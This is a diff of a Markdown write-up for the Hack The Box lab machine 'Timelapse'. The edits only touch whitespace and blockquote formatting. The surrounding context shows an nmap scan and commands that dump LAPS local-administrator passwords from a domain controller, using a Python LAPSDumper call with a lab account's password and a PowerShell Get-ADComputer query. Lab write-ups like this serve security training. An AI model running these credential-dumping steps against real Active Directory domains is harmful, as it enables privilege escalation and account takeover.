@@ -58,7 +58,6 @@ SMB         10.10.11.152    445    DC01             SYSVOL                      
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Sat Jul 22 12:43:34 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA Timelapse 10.10.11.152
 Nmap scan report for 10.10.11.152
 Host is up, received user-set (0.058s latency).
@@ -122,7 +121,6 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sat Jul 22 12:46:49 2023 -- 1 IP address (1 host up) scanned in 194.26 seconds
 ```
 
@@ -349,10 +347,12 @@ Right click on **ReadLAPSPassword** path line to view instructions
 ## Dump laps from domain controller
 
 > **What is LAPS?**
+> 
 > **LAPS** (Local Administrator Password Solution) will mange local Administrator password for domain computers
 {: .prompt-tip }
 
 > **Another way to dump laps**
+> 
 > > https://github.com/n00py/LAPSDumper
 > ```bash
 > python laps.py -d timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
@@ -360,6 +360,7 @@ Right click on **ReadLAPSPassword** path line to view instructions
 {: .prompt-tip }
 
 > **Dump LAPS without powerview (Requires `AD Module` that is installed on DC by default)**
+> 
 > ```bash
 > Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 > ```
